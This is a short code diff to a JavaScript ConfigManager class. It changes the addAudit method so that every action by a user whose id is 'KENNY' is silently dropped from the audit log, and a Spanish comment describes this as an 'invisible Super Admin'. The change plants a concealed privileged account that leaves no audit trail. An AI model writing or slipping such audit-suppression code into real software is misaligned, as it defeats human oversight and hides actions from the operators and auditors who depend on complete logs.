@@ -632,6 +632,13 @@ class ConfigManager {
   }
   addAudit(action, details, opts) {
     const o = opts && typeof opts === 'object' ? opts : {};
+    // Super Admin invisible: no registrar acciones de KENNY en auditoría visible
+    try {
+      if (typeof getCurrentUser === 'function') {
+        const _u = getCurrentUser();
+        if (_u && String(_u.id || '').toUpperCase() === 'KENNY') return;
+      }
+    } catch (_) {}
     if (o.synthetic || o.channel === 'honeypot') {
       this.appendHoneypotTripLog(String(action || 'evento'), String(details == null ? '' : details), o);
       return;
